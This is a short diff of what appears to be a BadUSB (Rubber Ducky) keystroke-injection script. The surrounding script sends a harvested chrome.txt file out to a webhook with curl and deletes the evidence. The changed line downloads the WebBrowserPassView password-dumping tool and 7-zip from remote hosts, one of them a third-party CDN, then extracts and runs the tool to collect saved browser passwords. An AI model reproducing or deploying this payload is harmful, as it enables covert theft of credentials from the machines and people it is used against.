@@ -74,8 +74,7 @@ STRING curl.exe -F "file1=@chrome.txt" $webhook; rm chrome.txt
 ENTER
 REM END OF CHROME EXFIL
 DELAY 1000
-STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip ; Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e wbpv.zip * -p"wbpv28821@"; .\WebBrowserPassView.exe
-ENTER
+STRING mkdir \temp ; cd \temp ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://cdn.lullaby.cafe/file/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip ; .\WebBrowserPassView.exe
 DELAY 10000
 CTRL A
 DELAY 500
